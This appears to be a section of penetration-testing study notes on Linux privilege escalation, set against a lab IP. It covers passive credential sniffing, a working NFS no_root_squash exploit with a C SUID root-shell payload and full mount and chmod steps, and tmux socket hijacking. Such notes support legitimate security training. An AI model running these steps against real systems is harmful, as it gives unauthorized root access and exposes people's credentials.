## Passive Traffic Capture

If a network interface is accessible without root, tools like `tcpdump`, `net-creds`, or `PCredz` can capture live traffic and extract credentials passively.

**High-value targets in cleartext protocols:**
- HTTP, FTP, Telnet, SMTP, POP, IMAP — credentials transmitted in plaintext
- SMBv2, Net-NTLMv2, Kerberos — hashes capturable and crackable offline

---

## Weak NFS Privileges

NFS (Network File System) shares directories over the network via TCP/UDP port 2049. The `no_root_squash` option — when set — allows a remote root user to act as root on the NFS server, bypassing the default UID remapping.

### Enumerate shares from the attacker machine

```shell
showmount -e 10.129.2.12
```

### Check export options on the target

```shell
cat /etc/exports
```

If `no_root_squash` appears on a share, the following attack applies.

### Exploit — SUID binary via NFS mount

**1. Write the payload**

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void) {
    setuid(0); setgid(0); system("/bin/bash");
}
```

**2. Compile**

```shell
gcc shell.c -o shell
```

**3. Mount the share, copy the binary, and set SUID** (run as root on attacker machine)

```shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

**4. Execute on the target**

```shell
/tmp/./shell
```

The binary runs as root regardless of who executes it.

> 💡 `no_root_squash` is the key flag to look for in `/etc/exports` — without it, the SUID bit gets remapped to an unprivileged UID and the attack fails.

---

## Tmux Session Hijacking

`tmux` sessions survive detachment and may keep running as a privileged user. If the session socket has weak permissions, it can be attached to directly.

### Find running tmux processes

```shell
ps aux | grep tmux
```

### Inspect the socket file permissions

```shell
ls -la /shareds
```

Group membership is required to attach — verify with:

```shell
id
```

### Attach to the session

```shell
tmux -S /shareds
```

Confirm privilege level after attaching:

```shell
id
```

> 💡 A tmux socket owned by root but with group read/write permissions is an instant escalation if our user shares that group — no exploit needed, just `tmux -S`.
